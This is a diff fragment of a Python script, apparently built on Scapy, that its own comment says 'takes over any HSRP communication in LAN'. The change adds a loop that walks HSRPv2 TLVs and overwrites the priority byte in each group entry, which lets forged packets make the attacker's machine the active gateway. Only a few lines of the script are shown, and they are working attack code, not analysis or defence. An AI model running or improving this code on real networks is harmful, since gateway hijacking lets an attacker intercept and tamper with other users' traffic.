@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 # $Id: 20121212$
-# $Date: 2012-12-12 01:06:14$
+# $Date: 2012-12-12 10:23:20$
 # $Author: Marek Lukaszuk$
 
 # This takes over any HSRP communication in LAN
@@ -82,7 +82,18 @@ p[UDP].chksum = None
 if str(p[HSRP])[2] == hsrpv2 and str(p[HSRP])[4] == hsrpv2active:
   data = str(p[HSRP])
   # print data.encode('hex')
-  data = data[:16]+chr(HSRPpri)+data[17:]
+
+  off = 0
+  while True:
+
+    if off >= len(data):
+      break
+
+    if data[off] == "\x01": # HSRPv2 TLV for group
+      data = data[:off+16]+chr(HSRPpri)+data[off+17:]
+
+    off += ord(data[off+1]) + 2
+ 
   # print data.encode('hex')
   p[UDP].payload = data.decode('string_escape')
 else:
